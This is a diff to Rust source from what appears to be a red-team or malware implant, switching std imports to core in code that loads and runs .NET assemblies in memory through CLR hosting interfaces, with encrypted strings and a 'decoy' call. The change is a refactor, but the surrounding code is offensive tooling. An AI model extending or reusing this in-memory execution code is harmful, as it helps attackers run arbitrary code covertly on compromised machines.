@@ -1,4 +1,4 @@
-use std::{ffi::c_void, iter::once, ptr::null_mut};
+use core::{ffi::c_void, iter::once, mem::zeroed, ptr::null_mut};
 
 use shared::{task_types::DotExDataForImplant, tasks::WyrmResult};
 use str_crypter::{decrypt_string, sc};
@@ -183,7 +183,7 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, Dotnet
     // it should the operator have instructed the process to do so.
     // After that, then we can load in the target assembly via the same load_3.
     //
-    let mut sp_assembly: *mut _Assembly = std::ptr::null_mut();
+    let mut sp_assembly: *mut _Assembly = null_mut();
     let load_3 = unsafe { (*(*app_domain).vtable).Load_3 };
 
     // Decoy - the result here is expected to be an error, so we dont want to check for this.
@@ -240,7 +240,7 @@ fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
     //
     // Wrap the inner String[]
     //
-    let mut v: VARIANT = unsafe { std::mem::zeroed() };
+    let mut v: VARIANT = unsafe { zeroed() };
 
     v.Anonymous.Anonymous.vt = (VT_ARRAY | VT_BSTR) as u16;
     v.Anonymous.Anonymous.Anonymous.parray = bstr_array;
@@ -320,7 +320,7 @@ fn create_safe_array(buf: &[u8]) -> Result<*mut SAFEARRAY, DotnetError> {
         return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
     }
 
-    unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), p_data as *mut u8, buf.len()) };
+    unsafe { core::ptr::copy_nonoverlapping(buf.as_ptr(), p_data as *mut u8, buf.len()) };
     let res = unsafe { SafeArrayUnaccessData(p_sa) };
     if res != 0 {
         return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
@@ -360,7 +360,7 @@ fn get_cor_runtime_host(
 ) -> Result<*mut ICorRuntimeHost, DotnetError> {
     let get_interface = unsafe { &*(*runtime).vtable }.GetInterface;
 
-    let mut p_host: *mut c_void = std::ptr::null_mut();
+    let mut p_host: *mut c_void = core::ptr::null_mut();
     let h_result =
         unsafe { get_interface(runtime, &CorRuntimeHost, &GUID_COR_RUNTIME, &mut p_host) };
     if h_result < 0 {
